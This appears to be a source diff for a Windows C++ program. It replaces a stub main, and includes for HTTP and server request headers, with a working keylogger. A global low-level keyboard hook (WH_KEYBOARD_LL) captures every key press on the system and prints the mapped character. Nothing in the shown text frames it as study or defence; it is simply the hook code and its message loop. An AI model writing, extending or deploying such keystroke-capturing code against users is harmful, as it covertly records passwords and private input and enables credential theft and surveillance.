@@ -1,9 +1,26 @@
-#include "HttpRequest.h"
-#include "ServerRequest.h"
 #include <windows.h>
+#include <iostream>
 
-int main(int argc, char** argv){
+using namespace std;
 
+HHOOK keyboard;
+KBDLLHOOKSTRUCT keyboardstruct;
 
-    return 0;
-}
+LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam){
+    if (keyboardcode >= 0){
+        keyboardstruct = *((KBDLLHOOKSTRUCT*)lParam);
+        if (wParam == WM_KEYDOWN){
+            char c = MapVirtualKey(keyboardstruct.vkCode, 2);
+            cout << c << endl;}}
+    return CallNextHookEx(keyboard, keyboardcode, wParam, lParam);}
+
+void CreateHook(){
+    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);}
+
+int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr,int cmd){
+    CreateHook();
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)){
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);}
+    return msg.wParam;}
